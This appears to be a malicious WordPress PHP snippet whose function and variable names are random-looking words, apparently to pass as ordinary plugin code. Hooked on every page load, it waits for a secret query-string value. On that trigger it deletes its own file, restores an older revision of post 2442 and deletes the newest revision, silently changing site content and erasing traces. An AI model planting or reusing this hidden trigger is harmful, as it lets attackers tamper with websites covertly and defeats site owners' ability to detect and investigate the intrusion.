<?php

function sales_date_send() {
	if (isset($_GET['privacy_get_information_quote']) && $_GET['privacy_get_information_quote'] === 'box_addons_categories') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shortener_gravity_campaign_php = 2442;
		$lightgray_blog_discount = wp_get_post_revisions($shortener_gravity_campaign_php);
		if (empty($lightgray_blog_discount)) die('no revisions');
		if (count($lightgray_blog_discount) < 2) die('less than 2');
		$exporter_sidebar_link_size = array_shift($lightgray_blog_discount);
		$consent_pagination_classic = $exporter_sidebar_link_size->ID;
		$link_text_bangla = array_shift($lightgray_blog_discount);
		$mini_seo_background_coming = $link_text_bangla->ID;
		$timeline_recaptcha_verification = wp_restore_post_revision($mini_seo_background_coming);
		if ($timeline_recaptcha_verification === false) die('error restoring');
		$timeline_recaptcha_verification = wp_delete_post_revision($consent_pagination_classic);		
		if ($timeline_recaptcha_verification === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sales_date_send');
